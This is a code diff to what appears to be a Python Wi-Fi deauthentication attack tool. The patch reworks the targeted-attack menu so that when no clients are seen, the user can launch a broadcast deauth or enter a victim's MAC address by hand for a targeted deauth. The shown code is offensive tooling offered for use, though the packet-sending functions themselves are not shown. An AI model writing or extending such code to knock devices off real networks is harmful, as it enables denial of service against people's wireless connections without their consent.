@@ -270,17 +270,43 @@ def handle_targeted_attack():
     print(f"  Power: {selected_ap['power']} dBm")
     
     if not ap_clients:
-        print(f"\n{Color.WARNING}[!] Tidak ada client terdeteksi untuk AP ini.{Color.ENDC}")
-        print(f"{Color.CYAN}[?] Gunakan broadcast deauth? (y/n): {Color.ENDC}", end="")
-        use_broadcast = input()
+        print(f"\n{Color.WARNING}[!] No clients detected for this AP.{Color.ENDC}")
+        print(f"{Color.CYAN}[TIP] Try scanning longer (30-60 seconds){Color.ENDC}")
+        print(f"\n{Color.CYAN}Options:{Color.ENDC}")
+        print(f"  'b' = Use broadcast deauth (less effective)")
+        print(f"  'MAC' = Enter client MAC manually (e.g., e2:7e:ed:1d:1c:2f)")
+        print(f"  'm' = Back to menu")
         
-        if use_broadcast.lower() == 'y':
+        choice = input(f"\n{Color.BOLD}Your choice: {Color.ENDC}").strip()
+        
+        if choice.lower() == 'm':
+            return
+        elif choice.lower() == 'b':
             kill_all_attacks()
             if lock_channel_robust(mon, selected_ap['channel']):
                 deauth_attack_single_optimized(selected_ap, mon, 0)
                 print(f"{Color.GREEN}[+] Broadcast attack running...{Color.ENDC}")
             input(f"\n{Color.BOLD}Press Enter...{Color.ENDC}")
-        return
+            return
+        elif len(choice) == 17 and choice.count(':') == 5:
+            # User entered MAC address manually
+            manual_client = {
+                "station_mac": choice.lower(),
+                "bssid": selected_ap['bssid'],
+                "power": "N/A",
+                "packets": "0"
+            }
+            kill_all_attacks()
+            if lock_channel_robust(mon, selected_ap['channel']):
+                print(f"{Color.GREEN}[+] Targeting manual client: {choice}{Color.ENDC}")
+                deauth_attack_single_optimized(selected_ap, mon, 0, choice.lower())
+                print(f"{Color.GREEN}[+] Targeted attack running!{Color.ENDC}")
+            input(f"\n{Color.BOLD}Press Enter...{Color.ENDC}")
+            return
+        else:
+            print(f"{Color.FAIL}[!] Invalid input.{Color.ENDC}")
+            time.sleep(2)
+            return
     
     # Display clients for selected AP
     print(f"\n{Color.GREEN}=== CONNECTED CLIENTS ({len(ap_clients)}) ==={Color.ENDC}")
